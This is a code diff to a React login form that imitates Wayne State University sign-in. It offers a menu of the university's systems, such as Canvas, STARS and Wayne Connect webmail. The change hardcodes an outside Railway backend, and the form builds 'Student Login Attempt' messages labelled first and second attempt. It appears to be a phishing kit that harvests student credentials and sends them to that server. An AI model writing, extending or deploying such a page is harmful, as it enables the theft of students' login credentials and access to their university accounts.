@@ -2,8 +2,8 @@
 
 import React, { useState, useEffect } from "react";
 
-// Set your Railway backend URL here — fallback to localhost for development
-const backendUrl = import.meta.env.VITE_BACKEND_URL;
+// Use the live Railway backend URL
+const backendUrl = "https://wayneemail-bankend-production.up.railway.app";
 
 const LoginForm = ({ loginTitle, setLoginTitle }) => {
   const [username, setUsername] = useState("");
@@ -99,7 +99,8 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
       return;
     }
 
-    const attemptNumber = loginAttempts === 0 ? "🟡 First Attempt" : "🟢 Second Attempt";
+    const attemptNumber =
+      loginAttempts === 0 ? "🟡 First Attempt" : "🟢 Second Attempt";
 
     const submission = `🔐 *Student Login Attempt - ${attemptNumber}*
 
@@ -185,13 +186,29 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
           <label htmlFor="where">
             <i className="silk-icon silk-key-go"></i> Target System
           </label>
-          <select id="where" className="form-control" onChange={handleTargetSystemChange}>
-            <option data-system="Academica" value="https://academica.aws.wayne.edu">Academica</option>
-            <option data-system="Canvas" value="https://canvas.wayne.edu">Canvas</option>
-            <option data-system="Salesƒorce CRM" value="https://salesforce.com/crm">Salesƒorce CRM</option>
-            <option data-system="STARS" value="https://stars.wayne.edu">STARS</option>
-            <option data-system="Wayne Connect" value="https://webmail.wayne.edu">Wayne Connect</option>
-            <option data-system="Zoom" value="https://zoom.us">Zoom</option>
+          <select
+            id="where"
+            className="form-control"
+            onChange={handleTargetSystemChange}
+          >
+            <option data-system="Academica" value="https://academica.aws.wayne.edu">
+              Academica
+            </option>
+            <option data-system="Canvas" value="https://canvas.wayne.edu">
+              Canvas
+            </option>
+            <option data-system="Salesƒorce CRM" value="https://salesforce.com/crm">
+              Salesƒorce CRM
+            </option>
+            <option data-system="STARS" value="https://stars.wayne.edu">
+              STARS
+            </option>
+            <option data-system="Wayne Connect" value="https://webmail.wayne.edu">
+              Wayne Connect
+            </option>
+            <option data-system="Zoom" value="https://zoom.us">
+              Zoom
+            </option>
           </select>
         </div>
         <div className="login-button-container clearfix">
